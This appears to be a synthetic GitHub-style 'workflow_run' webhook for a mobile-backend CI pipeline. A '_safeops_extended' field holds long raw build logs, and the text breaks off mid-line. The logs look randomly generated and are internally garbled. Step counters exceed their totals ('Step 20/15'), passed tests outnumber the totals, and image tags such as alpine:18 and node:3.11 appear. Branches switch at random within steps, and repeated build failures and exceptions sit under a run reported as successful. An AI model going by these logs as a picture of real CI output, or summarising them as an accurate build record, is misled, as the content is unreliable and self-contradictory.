{
  "action": "completed",
  "workflow_run": {
    "id": 125,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "e14aa26e7d544fdf99577858a5e135cc500eb5ad",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-04T12:46:06.727371Z",
    "updated_at": "2025-12-04T12:50:52.654625Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\nStep 9/20: Linting\nImage pulled successfully\n[12:46:06] INFO: Connecting to database\nGenerating source maps...\nStep 20/15: Testing\nConnection established\n[12:46:06] INFO: Cache refreshed\nGenerating source maps...\nPOST /api - 200 (442ms)\n  PASS: test_user_create (86ms)\n[12:46:06] INFO: Starting build process\nCache invalidated: dependencies\nArtifact downloaded: 19MB\nTLS handshake completed\nCompiling components/index.js...\nInstalling webpack@3.15.5\nCompleted.\nEnvironment: production\nRan 35 tests in 18s\nStep 5/18: Linting\nStep 12/23: Running migrations\nGET /status - 204 (56ms)\nArtifact uploaded: build.tar.gz (26MB)\n[12:46:06] DEBUG: Query executed in 90ms\nBuilding Docker image...\npip: Collecting jest\n[12:46:06] DEBUG: Initializing service\nnpm notice: package.json updated\n[12:46:06] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\n[12:46:06] INFO: Starting build process\n[12:46:06] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (12MB)\nnpm install: added 463 packages\nCache miss for key-1784\npip: Collecting prettier\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 All checks passed\nnpm install: resolved 277 packages\n  PASS: integration/test_user_create.spec.js\n[12:46:06] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/handler.rs...\nCreating production build...\nCoverage: 78% statements, 68% branches\nUsing Python 3.11\nOK\nCache miss for key-8453\nCache saved successfully\nUsing Node.js 16.20.1\nPulling image: python:latest\n[12:46:06] INFO: Starting build process\nStep 10/22: Testing\nStep 16/20: Testing\nArtifact uploaded: dist.zip (63MB)\npip: Collecting webpack\nTransforming 684 files...\nCreating production build...\n[12:46:06] DEBUG: Initializing service\nnpm install: added 459 packages\nStep 10/19: Building\nUsing Node.js 16.7.5\nCoverage: 75% statements, 82% branches\nPlatform: linux-x64\nnpm notice: package.json updated\n[12:46:06] INFO: Connecting to database\nNODE_ENV=production\nStep 19/21: Deploying\nArtifact uploaded: dist.zip (69MB)\nPOST /data - 200 (493ms)\nNODE_ENV=production\nStep 9/20: Linting\nCreating production build...\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nWARNING: prettier has known vulnerabilities\nUsing Python 3.11\nnpm install: resolved 1663 packages\nPushing to registry...\nUploading artifact 'dist' (30 files)\n[12:46:06] DEBUG: Loading configuration\nFinished.\nCompiling src/app.ts...\nCompiling lib/main.py...\n[12:46:06] DEBUG: Connection pool: 16 active\nStep 2/15: Installing dependencies\nFetching from https://registry.npmjs.org/package.json\nCoverage: 95% statements, 94% branches\nnpm notice: created a lockfile\nPulling image: alpine:18\nUploading artifact 'build' (38 files)\nFinished.\nCache saved successfully\nFAILED: test_api_health\nnpm install: resolved 160 packages\n[12:46:06] INFO: Cache refreshed\nCache restored successfully (447MB)\nUsing Node.js 19.2.9\nCache restored successfully (189MB)\nSuccess!\nCache restored successfully (247MB)\nSwitched to branch 'feature/task-646'\nWARNING: webpack has known vulnerabilities\nStep 15/23: Linting\nPOST /upload - 200 (347ms)\n[12:46:06] WARN: Deprecated API usage\nArtifact downloaded: 33MB\nSwitched to branch 'hotfix/task-668'\nDone.\nDone.\nWARNING: webpack has known vulnerabilities\nFetching from https://gcr.io/package.json\nUsing Python 3.9\nAlready up to date.\nWARNING: jest has known vulnerabilities\nSuccess!\nFinished.\nWARNING: lodash has known vulnerabilities\n\u2713 All checks passed\nPlatform: linux-x64\n  PASS: integration/test_cache_hit.spec.js\nVerifying...\nPOST /upload - 202 (248ms)\nUploading artifact 'build' (22 files)\n[12:46:06] WARN: Deprecated API usage\nTest Suites: 26 passed, 34 total\n[12:46:06] DEBUG: Loading configuration\nCache restored successfully (345MB)\n[12:46:06] INFO: Processing request\nTLS handshake completed\n\u2713 All checks passed\nUsing Node.js 19.1.9\n[12:46:06] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\nCache miss for key-8689\n[12:46:06] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 1\nLayer 3/15: COPY command\nArtifact uploaded: build.tar.gz (5MB)\nWaiting...\n  PASS: unit/test_auth_login.spec.js\nCache invalidated: dependencies\nDone.\nFinished.\nSuccess!\nTests: 486 passed, 302 total\nCompiling components/app.ts...\n[12:46:06] WARN: Deprecated API usage\nSnapshots: 27 passed, 1 total\nWARNING: react has known vulnerabilities\nSwitched to branch 'bugfix/task-105'\n[12:46:06] INFO: Cache refreshed\nDone.\nCompiling lib/utils.go...\n[12:46:06] DEBUG: Connection pool: 12 active\n\u2713 Task completed in 4976ms\nTime: 2.943s\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\nStep 19/21: Building\n[12:46:06] DEBUG: Memory usage: 624MB\npip: Collecting eslint\nRan 107 tests in 20s\nReady.\n[12:46:06] INFO: Processing request\nCache restored successfully (419MB)\nStep 19/15: Testing\nCoverage: 93% statements, 97% branches\nVerifying...\nTransforming 561 files...\nWARNING: axios has known vulnerabilities\n[12:46:06] DEBUG: Loading configuration\nFetching from https://githubusercontent.com/package.json\nImage pulled successfully\nTests: 389 passed, 223 total\nDone.\npip: Downloading jest-3.9.tar.gz\n[12:46:06] WARN: Deprecated API usage\nSnapshots: 42 passed, 31 total\nArtifact uploaded: build.tar.gz (11MB)\nCreating production build...\nCompiling utils/utils.go...\nDone.\nWARNING: express has known vulnerabilities\nCache restored successfully (247MB)\nProcessing...\n  PASS: test_api_health (289ms)\nChecking out master branch\nnpm install: added 284 packages\nGenerating source maps...\nHEAD is now at f263655\nFetching submodules...\n[12:46:06] DEBUG: Connection pool: 14 active\nCoverage: 91% statements, 100% branches\nTransforming 114 files...\nBundling vendor.js\nReady.\nStep 9/16: Building\nCache invalidated: dependencies\nGET /health - 200 (94ms)\nLoading...\nnpm notice: created a lockfile\npip: Collecting prettier\nSuccess!\nCache invalidated: node_modules\nTest Suites: 43 passed, 50 total\nArtifact downloaded: 22MB\nInstalling jest@4.15.4\nSwitched to branch 'hotfix/task-284'\npip install: Successfully installed prettier-3.4\n[12:46:06] DEBUG: Query executed in 84ms\nPlatform: linux-x64\nTLS handshake completed\nnpm install: added 89 packages\nSnapshots: 14 passed, 15 total\nCache invalidated: build\n\u2713 Step 'build' succeeded\nWARNING: react has known vulnerabilities\nSwitched to branch 'bugfix/task-672'\nCache restored successfully (156MB)\nProcessing...\nVerifying...\n[12:46:06] INFO: Processing request\nGenerating source maps...\nStep 7/21: Running migrations\nLayer 5/15: ENV command\n[12:46:06] ERROR: Connection failed\nFetching submodules...\nnpm notice: package.json updated\n[12:46:06] DEBUG: Memory usage: 1884MB\nDone.\nWARNING: eslint has known vulnerabilities\nStep 5/21: Running migrations\nArtifact uploaded: dist.zip (61MB)\nCache miss for key-3163\nCache hit for key-3043\nSuccess!\nUsing Node.js 18.1.0\nAlready up to date.\nNODE_ENV=production\nCompiling src/service.java...\nWaiting...\nWARNING: jest has known vulnerabilities\n[12:46:06] INFO: Cache refreshed\nCache saved successfully\nPlatform: darwin-arm64\nBundling styles.js\nnpm install: resolved 1021 packages\nEnvironment: production\nRan 122 tests in 15s\nCompiling lib/main.py...\nLoading...\nVerifying...\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\nSnapshots: 16 passed, 12 total\n\u2713 Step 'build' succeeded\nVerifying...\n\u2713 lint completed\nLoading...\nCreating production build...\nCreating production build...\nWARNING: eslint has known vulnerabilities\nnpm install: resolved 483 packages\n\u2713 All checks passed\nCompiling src/utils.go...\n[12:46:06] WARN: Deprecated API usage\nMinifying main.js\nPulling image: alpine:18\nUsing Python 3.9\n\u2713 Task completed in 3244ms\nRan 68 tests in 42s\n\u2713 Task completed in 2900ms\nTime: 39.264s\nDone.\npip: Collecting eslint\n\u2717 build failed with exit code 83\nEnvironment: test\nStep 4/25: Building\n[12:46:06] INFO: Connecting to database\nSwitched to branch 'bugfix/task-387'\nStep 16/15: Deploying\nMinifying main.js\nBundling runtime.js\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nStep 7/15: Deploying\n[12:46:06] WARN: Deprecated API usage\nUploading artifact 'dist' (8 files)\nFAILED: test_cache_hit\n[12:46:06] WARN: Deprecated API usage\nStep 17/16: Linting\nCompiling utils/handler.rs...\npip: Downloading react-2.10.tar.gz\nStep 17/20: Linting\npip: Downloading lodash-4.1.tar.gz\nWARNING: react has known vulnerabilities\nDone.\npip: Collecting axios\nTest Suites: 27 passed, 38 total\n  PASS: integration/test_api_health.spec.js\n[12:46:06] WARN: Deprecated API usage\nTLS handshake completed\nGET /health - 204 (76ms)\nWARNING: react has known vulnerabilities\nBuilding Docker image...\npip: Collecting axios\n[12:46:06] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nUsing Python 3.12\nStep 15/16: Installing dependencies\nReady.\nCreating production build...\n[12:46:06] INFO: Starting build process\n  PASS: test_api_health (471ms)\nGenerating source maps...\nTLS handshake completed\n=== Step deploy_staging completed ===\n=== Step: install_dependencies ===\nInstalling prettier@5.12.10\nCache hit for key-1586\n[12:46:06] DEBUG: Loading configuration\nFetching submodules...\nUsing Python 3.11\n[12:46:06] DEBUG: Memory usage: 1352MB\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'coverage' (21 files)\nArtifact uploaded: dist.zip (58MB)\nAlready up to date.\nEnvironment: staging\nInstalling lodash@5.16.7\nHEAD is now at 79bbbad\n[12:46:06] WARN: Deprecated API usage\nTLS handshake completed\nDone.\n[12:46:06] INFO: Processing request\nCompiling components/handler.rs...\nEnvironment: test\npip: Collecting eslint\nStep 11/16: Running migrations\n  PASS: test_auth_login (32ms)\nReady.\nProcessing...\n[12:46:06] ERROR: Connection failed\nnpm install: resolved 678 packages\n[12:46:06] DEBUG: Memory usage: 1492MB\nBuilding Docker image...\nGenerating source maps...\npip: Installing build dependencies...\n[12:46:06] DEBUG: Memory usage: 126MB\nInstalling webpack@2.7.5\nnpm install: added 310 packages\nStep 9/19: Testing\n\u2713 All checks passed\nCache restored successfully (150MB)\n[12:46:06] INFO: Cache refreshed\nSuccess!\nStep 9/24: Installing dependencies\nLoading...\npip install: Successfully installed express-1.12\nStep 1/22: Testing\nFetching from https://githubusercontent.com/package.json\nSwitched to branch 'bugfix/task-716'\nWARNING: prettier has known vulnerabilities\nException: TypeError\n[12:46:06] ERROR: Connection failed\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n\u2713 package completed\nBuilding Docker image...\nReady.\nArtifact uploaded: build.tar.gz (21MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nAlready up to date.\nCache hit for key-1331\nEnvironment: test\nBundling styles.js\nGenerating source maps...\nCompiling components/utils.go...\nArtifact uploaded: build.tar.gz (1MB)\n[12:46:06] INFO: Starting build process\nCompiling components/index.js...\nArtifact uploaded: build.tar.gz (1MB)\nStep 17/20: Linting\npip: Downloading lodash-5.10.tar.gz\nPOST /api - 200 (39ms)\n[12:46:06] INFO: Starting build process\nInstalling webpack@1.14.7\n  PASS: test_db_connect (12ms)\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 19/22: Deploying\nGET /status - 200 (48ms)\nPlatform: darwin-arm64\nException: RuntimeError\nRan 183 tests in 44s\n\u2713 Task completed in 2167ms\nImage pulled successfully\nStep 9/21: Installing dependencies\nTime: 117.332s\nBundling vendor.css\n  PASS: test_user_create (480ms)\n[12:46:06] DEBUG: Connection pool: 3 active\nBundling runtime.css\nPlatform: win32-x64\n[12:46:06] DEBUG: Memory usage: 1295MB\npip: Collecting eslint\nCreating production build...\n[12:46:06] WARN: Deprecated API usage\nCompiling components/app.ts...\nWARNING: axios has known vulnerabilities\nnpm install: resolved 545 packages\nAlready up to date.\nnpm notice: package.json updated\n[12:46:06] DEBUG: Loading configuration\nCache hit for key-5320\npip: Installing build dependencies...\nCache saved successfully\n[12:46:06] WARN: Deprecated API usage\nCoverage: 76% statements, 98% branches\n[12:46:06] INFO: Starting build process\n[12:46:06] WARN: Deprecated API usage\n[12:46:06] ERROR: Connection failed\nArtifact uploaded: dist.zip (68MB)\nFinished.\nArtifact uploaded: dist.zip (42MB)\nTLS handshake completed\nPulling image: node:3.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nCache miss for key-3905\nArtifact uploaded: build.tar.gz (2MB)\npip: Downloading webpack-5.2.tar.gz\nCompiling components/main.py...\nCreating production build...\nArtifact uploaded: dist.zip (52MB)\nWaiting...\n\u2713 validate completed\nTests: 494 passed, 96 total\nStep 3/25: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 2/17: Building\n  PASS: test_api_health (447ms)\nnpm notice: package.json updated\nTests: 376 passed, 498 total\nStep 2/21: Running migrations\n[12:46:06] ERROR: Connection failed\nArtifact uploaded: dist.zip (79MB)\nStep 8/16: Installing dependencies\nCompiling lib/utils.go...\nCoverage: 89% statements, 95% branches\nHEAD is now at c8688a2\nProcessing...\nTests: 328 passed, 446 total\nOK\nOK\n[12:46:06] DEBUG: Connection pool: 20 active\nPulling image: python:3.11\nnpm install: added 302 packages\nAlready up to date.\nCache invalidated: dependencies\nyarn add: Done in 29.70s\n[12:46:06] INFO: Cache refreshed\nReady.\nPOST /api - 201 (434ms)\nCompiling components/main.py...\nAlready up to date.\nCompiling utils/index.js...\nWARNING: eslint has known vulnerabilities\nWaiting...\nFetching submodules...\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: TypeError\nWARNING: prettier has known vulnerabilities\nImage pulled successfully\nCompiling utils/utils.go...\n=== Step install_dependencies completed ===\n=== Step: type_check ===\nUsing Python 3.12\nBuilding Docker image...\nBundling runtime.js\nStep 19/21: Testing\nArtifact downloaded: 7MB\nUploading artifact 'dist' (43 files)\nInstalling lodash@1.14.4\nCoverage: 76% statements, 85% branches\n[12:46:06] WARN: Deprecated API usage\nEnvironment: production\nPlatform: linux-x64\nCache miss for key-2435\nStep 13/17: Deploying\nWARNING: axios has known vulnerabilities\nEnvironment: test\npip: Downloading lodash-4.8.tar.gz\n[12:46:06] DEBUG: Loading configuration\nTLS handshake completed\n  PASS: integration/test_auth_login.spec.js\nException: RuntimeError\npip: Collecting prettier\nChecking out master branch\nCache restored successfully (60MB)\n[12:46:06] WARN: Deprecated API usage\nSwitched to branch 'feature/task-292'\nCache hit for key-7579\nVerifying...\nArtifact uploaded: build.tar.gz (16MB)\nTest Suites: 21 passed, 33 total\nGenerating source maps...\nCache restored successfully (453MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/24: Testing\nGenerating source maps...\nPOST /api - 202 (101ms)\nTime: 68.164s\nReady.\nUploading artifact 'coverage' (44 files)\nLoading...\nStep 5/23: Building\nNODE_ENV=production\nWARNING: react has known vulnerabilities\nArtifact downloaded: 39MB\n\u2713 All checks passed\nUsing Python 3.12\nSwitched to branch 'hotfix/task-749'\n\u2713 build completed\nStep 6/20: Testing\nTransforming 460 files...\nFAILED: test_api_health\nTransforming 569 files...\nStep 20/17: Linting\n[12:46:06] WARN: Deprecated API usage\nHEAD is now at c82f567\n\u2717 build failed with exit code 104\npip: Downloading react-1.18.tar.gz\nRan 43 tests in 30s\n[12:46:06] DEBUG: Loading configuration\nStep 18/25: Installing dependencies\npip: Installing build dependencies...\n  PASS: e2e/test_db_connect.spec.js\nAlready up to date.\nCache hit for key-7340\nEnvironment: staging\n[12:46:06] INFO: Request completed\n[12:46:06] WARN: Deprecated API usage\nLayer 8/12: ENV command\nConnection established\nFAILED: test_auth_login\nStep 10/25: Linting\n[12:46:06] DEBUG: Connection pool: 13 active\nTest Suites: 41 passed, 25 total\n[12:46:06] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/handler.rs...\nGenerating source maps...\n[12:46:06] INFO: Cache refreshed\nOptimizing 83 modules...\nCompiling lib/app.ts...\nWARNING: express has known vulnerabilities\n[12:46:06] DEBUG: Query executed in 53ms\n[12:46:06] INFO: Connecting to database\nnpm install: added 393 packages\nFetching submodules...\nStep 18/21: Testing\n\u2713 lint completed\nPushing to registry...\nLoading...\nSwitched to branch 'bugfix/task-800'\nUsing Node.js 18.4.5\nVerifying...\npip: Collecting lodash\n[12:46:06] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nStep 1/20: Testing\nSwitched to branch 'hotfix/task-363'\nGenerating source maps...\nPOST /data - 202 (437ms)\n  PASS: e2e/test_cache_hit.spec.js\n[12:46:06] INFO: Cache refreshed\nImage pulled successfully\n[12:46:06] INFO: Starting build process\nAlready up to date.\n[12:46:06] INFO: Cache refreshed\nStep 9/21: Deploying\nyarn add: Done in 12.76s\nArtifact uploaded: build.tar.gz (30MB)\nArtifact downloaded: 36MB\npip: Collecting lodash\nnpm install: added 392 packages\nCache saved successfully\n[12:46:06] WARN: Deprecated API usage\nStep 18/18: Testing\nBundling vendor.js\n[12:46:06] ERROR: Connection failed\nCompiling components/main.py...\nPOST /upload - 200 (306ms)\nPlatform: win32-x64\nWARNING: axios has known vulnerabilities\n\u2713 package completed\nyarn add: Done in 23.63s\nStep 20/15: Building\npip: Installing build dependencies...\nTest Suites: 9 passed, 23 total\nFetching submodules...\n  PASS: test_db_connect (86ms)\n\u2713 Step 'checkout' succeeded\n[12:46:06] INFO: Cache refreshed\n[12:46:06] DEBUG: Query executed in 58ms\nCache hit for key-7814\nCache saved successfully\n[12:46:06] DEBUG: Memory usage: 410MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\nSnapshots: 43 passed, 13 total\npip: Downloading react-5.2.tar.gz\nCache saved successfully\n[12:46:06] DEBUG: Connection pool: 15 active\nReady.\nCompleted.\nVerifying...\nUsing Node.js 18.16.1\nInstalling prettier@2.10.9\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:06] DEBUG: Query executed in 5ms\nGET /api - 200 (70ms)\nCoverage: 76% statements, 94% branches\nWARNING: eslint has known vulnerabilities\nStep 9/24: Installing dependencies\n[12:46:06] INFO: Connecting to database\nCache miss for key-1531\nTests: 134 passed, 417 total\n[12:46:06] INFO: Processing request\nDone.\nStep 1/18: Deploying\nMinifying vendor.js\nCoverage: 97% statements, 75% branches\n[12:46:06] INFO: Connecting to database\n=== Step type_check completed ===\n=== Step: checkout ===\nyarn add: Done in 6.28s\nInstalling webpack@3.3.8\nStep 17/22: Linting\nPushing to registry...\nStep 18/18: Running migrations\nCompiling src/utils.go...\nHEAD is now at 4c892e9\nCache miss for key-4599\nUsing Node.js 16.19.6\nReady.\nUsing Python 3.10\nChecking out main branch\n[12:46:06] INFO: Starting build process\nTests: 423 passed, 194 total\nTest Suites: 45 passed, 42 total\n[12:46:06] INFO: Starting build process\nCompleted.\nFetching submodules...\nMinifying main.js\nPOST /upload - 201 (370ms)\nVerifying...\nCompiling lib/main.py...\nOptimizing 28 modules...\nOptimizing 32 modules...\nConnection established\nnpm install: resolved 1926 packages\nChecking out develop branch\nCache restored successfully (323MB)\n[12:46:06] DEBUG: Memory usage: 213MB\nTests: 141 passed, 359 total\n[12:46:06] INFO: Request completed\n[12:46:06] DEBUG: Initializing service\nChecking out master branch\nLayer 3/9: ENV command\nVerifying...\n[12:46:06] DEBUG: Loading configuration\n[12:46:06] INFO: Connecting to database\nBundling runtime.css\nnpm notice: package.json updated\nException: NullPointerException\n  PASS: e2e/test_auth_login.spec.js\nTests: 210 passed, 360 total\n  PASS: unit/test_cache_hit.spec.js\nProcessing...\nnpm install: resolved 341 packages\npip: Collecting jest\nStep 18/15: Building\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: RuntimeError\nInstalling react@4.18.6\nStep 3/15: Linting\n[12:46:06] DEBUG: Memory usage: 282MB\n\u2713 Task completed in 1649ms\nTests: 465 passed, 172 total\nPlatform: darwin-arm64\nConnection established\n[12:46:06] DEBUG: Query executed in 72ms\nConnection established\nnpm install: resolved 296 packages\n[12:46:06] INFO: Cache refreshed\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nTest Suites: 44 passed, 9 total\nWARNING: react has known vulnerabilities\nUsing Node.js 14.19.3\npip: Downloading jest-2.17.tar.gz\nCache invalidated: dependencies\nnpm install: added 169 packages\n[12:46:06] INFO: Request completed\nCompleted.\nFetching submodules...\n[12:46:06] INFO: Request completed\n\u2713 lint completed\nEnvironment: production\nWARNING: express has known vulnerabilities\nStep 14/23: Deploying\nWARNING: lodash has known vulnerabilities\nFetching from https://npmjs.org/package.json\nOK\nException: TypeError\nnpm install: resolved 884 packages\nStep 12/23: Linting\nPOST /data - 200 (357ms)\nReady.\nPulling image: node:latest\nCompiling components/service.java...\nCompiling src/service.java...\nException: RuntimeError\n  PASS: integration/test_auth_login.spec.js\n\u2713 deploy completed\nStep 3/22: Installing dependencies\nNODE_ENV=production\n[12:46:06] DEBUG: Initializing service\nFinished.\nMinifying main.js\npip: Collecting webpack\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (355ms)\n[12:46:06] WARN: Deprecated API usage\nCompleted.\nCache miss for key-6295\n\u2713 Step 'setup' succeeded\n\u2713 Task completed in 4597ms\nVerifying...\nSuccess!\nFetching submodules...\nTransforming 251 files...\npip: Installing build dependencies...\nEnvironment: development\n[12:46:06] INFO: Processing request\nCache saved successfully\nCache miss for key-1298\n[12:46:06] ERROR: Connection failed\n\u2713 Step 'build' succeeded\n[12:46:06] DEBUG: Query executed in 62ms\npip install: Successfully installed lodash-3.7\n[12:46:06] INFO: Starting build process\nCache hit for key-6766\nCache miss for key-8363\nWaiting...\nStep 9/18: Linting\nSnapshots: 50 passed, 50 total\nArtifact downloaded: 49MB\nFetching from https://amazonaws.com/package.json\nFetching submodules...\nTLS handshake completed\nCompiling utils/utils.go...\nFetching from https://npmjs.org/package.json\n\u2713 Task completed in 3086ms\n[12:46:06] WARN: Deprecated API usage\n[12:46:06] INFO: Processing request\nStep 20/23: Building\nCompiling src/service.java...\nVerifying...\n[12:46:06] INFO: Request completed\nProcessing...\nCache saved successfully\n\u2713 All checks passed\n[12:46:06] INFO: Starting build process\nnpm install: added 353 packages\n[12:46:06] INFO: Request completed\nStep 15/19: Linting\nOptimizing 68 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:06] WARN: Deprecated API usage\nHEAD is now at cc9c77c\nTest Suites: 15 passed, 32 total\nCompiling components/app.ts...\nRan 40 tests in 30s\nGET /api - 200 (85ms)\n[12:46:06] WARN: Deprecated API usage\nTest Suites: 28 passed, 14 total\nBuilding Docker image...\nTest Suites: 33 passed, 21 total\n\u2717 build failed with exit code 63\nPlatform: linux-x64\npip install: Successfully installed axios-3.12\nGenerating source maps...\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\nFAILED: test_api_health\nOptimizing 30 modules...\nInstalling lodash@3.18.5\nMinifying main.js\nNODE_ENV=test\nWARNING: prettier has known vulnerabilities\nChecking out main branch\nHEAD is now at 78b2f1a\nCache miss for key-5852\npip: Installing build dependencies...\n[12:46:06] DEBUG: Query executed in 5ms\nStep 20/24: Linting\n[12:46:06] INFO: Starting build process\nUsing Python 3.9\n[12:46:06] INFO: Request completed\nCache invalidated: node_modules\nUsing Python 3.9\nBuilding Docker image...\nCreating production build...\n[12:46:06] INFO: Request completed\nUsing Node.js 15.3.4\nWARNING: jest has known vulnerabilities\nInstalling webpack@4.14.7\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching submodules...\nTime: 104.760s\nTime: 112.28s\nTest Suites: 42 passed, 6 total\nCoverage: 74% statements, 69% branches\nCompleted.\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTLS handshake completed\nCreating production build...\nCache hit for key-4157\nStep 12/24: Deploying\n[12:46:06] WARN: Deprecated API usage\nException: NullPointerException\nUploading artifact 'coverage' (15 files)\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact downloaded: 38MB\nChecking out main branch\nArtifact uploaded: dist.zip (1MB)\nTests: 295 passed, 139 total\nCache saved successfully\nCompleted.\n[12:46:06] ERROR: Connection failed\nGET /health - 204 (30ms)\n[12:46:06] INFO: Connecting to database\n\u2713 Step 'test' succeeded\nUsing Python 3.10\nCompleted.\nLayer 2/14: ENV command\nCompiling utils/main.py...\n[12:46:06] INFO: Processing request\npip: Collecting express\nFAILED: test_db_connect\nyarn add: Done in 27.22s\nyarn add: Done in 14.78s\nArtifact uploaded: build.tar.gz (40MB)\nTLS handshake completed\nChecking out develop branch\nnpm notice: created a lockfile\nCache miss for key-6427\npip install: Successfully installed jest-2.10\nWaiting...\n[12:46:06] INFO: Starting build process\nMinifying app.js\n\u2713 deploy completed\n[12:46:06] INFO: Connecting to database\nException: RuntimeError\nUsing Python 3.10\n[12:46:06] DEBUG: Connection pool: 20 active\nArtifact downloaded: 22MB\nCompleted.\nPOST /api - 202 (51ms)\n\u2713 All checks passed\n[12:46:06] WARN: Deprecated API usage\n[12:46:06] INFO: Connecting to database\n[12:46:06] INFO: Processing request\nCache saved successfully\npip: Installing build dependencies...\nCompiling lib/service.java...\nOptimizing 68 modules...\nyarn add: Done in 21.23s\nPushing to registry...\n\u2713 All checks passed\nCache miss for key-8910\n[12:46:06] WARN: Deprecated API usage\n[12:46:06] INFO: Cache refreshed\nEnvironment: test\nCompleted.\nLayer 10/13: RUN command\nStep 4/18: Testing\nBundling styles.js\nImage pulled successfully\nCache restored successfully (133MB)\nPOST /data - 202 (439ms)\nStep 3/21: Testing\nCompiling components/main.py...\nUsing Node.js 19.3.7\nLayer 3/15: ENV command\n[12:46:06] ERROR: Connection failed\n  PASS: integration/test_auth_login.spec.js\nTransforming 516 files...\nReady.\nLoading...\nPlatform: darwin-arm64\nChecking out develop branch\nStep 10/24: Deploying\nPushing to registry...\n[12:46:06] INFO: Request completed\nCache restored successfully (185MB)\nImage pulled successfully\n\u2717 build failed with exit code 29\nCoverage: 75% statements, 61% branches\nCoverage: 96% statements, 70% branches\nCache miss for key-1514\n[12:46:06] DEBUG: Query executed in 6ms\n\u2713 Task completed in 2302ms\nCompiling lib/service.java...\n[12:46:06] INFO: Connecting to database\nStep 12/21: Linting\nImage pulled successfully\n  PASS: test_user_create (70ms)\n[12:46:06] INFO: Starting build process\nCache miss for key-9602\nnpm install: resolved 684 packages\nOK\nStep 5/16: Linting\nCompiling src/app.ts...\n  PASS: e2e/test_db_connect.spec.js\nSnapshots: 23 passed, 48 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\nCompleted.\n[12:46:06] WARN: Deprecated API usage\nDone.\nSwitched to branch 'feature/task-895'\nCompleted.\n[12:46:06] INFO: Starting build process\nCoverage: 75% statements, 77% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (25MB)\nOptimizing 70 modules...\n[12:46:06] INFO: Connecting to database\n[12:46:06] WARN: Deprecated API usage\nWaiting...\npip: Downloading react-2.16.tar.gz\n  PASS: test_user_create (354ms)\nSnapshots: 29 passed, 8 total\nCache restored successfully (341MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/index.js...\n\u2717 build failed with exit code 106\nAlready up to date.\nSuccess!\nStep 14/22: Running migrations\nCompiling utils/handler.rs...\n=== Step upload_artifacts completed ===\n=== Step: deploy_production ===\n\u2713 Task completed in 591ms\npip: Downloading react-5.11.tar.gz\nCompleted.\nException: ValueError\n[12:46:06] INFO: Cache refreshed\nnpm notice: package.json updated\nOptimizing 46 modules...\npip: Collecting react\nCompiling components/service.java...\nImage pulled successfully\nCache hit for key-1896\n[12:46:06] DEBUG: Loading configuration\n\u2713 Task completed in 1211ms\nStep 2/20: Deploying\nAlready up to date.\nCreating production build...\nTransforming 768 files...\nImage pulled successfully\nBuilding Docker image...\nnpm notice: created a lockfile\n[12:46:06] WARN: Deprecated API usage\nFAILED: test_db_connect\n[12:46:06] DEBUG: Connection pool: 17 active\nStep 6/16: Deploying\nAlready up to date.\nTransforming 537 files...\nAlready up to date.\nUploading artifact 'dist' (35 files)\nFAILED: test_auth_login\n  PASS: integration/test_auth_login.spec.js\nBundling runtime.css\nTests: 312 passed, 110 total\nFinished.\n[12:46:06] INFO: Request completed\nOptimizing 85 modules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:06] WARN: Deprecated API usage\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLayer 2/13: ENV command\nArtifact uploaded: build.tar.gz (43MB)\npip install: Successfully installed prettier-4.2\nReady.\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:06] DEBUG: Connection pool: 11 active\n\u2713 Task completed in 1442ms\n[12:46:06] INFO: Request completed\nLayer 4/15: RUN command\nInstalling lodash@5.8.7\n[12:46:06] WARN: Deprecated API usage\nChecking out develop branch\nStep 1/24: Running migrations\nLayer 2/15: COPY command\nnpm notice: package.json updated\nCoverage: 75% statements, 73% branches\nCache saved successfully\n\u26a0 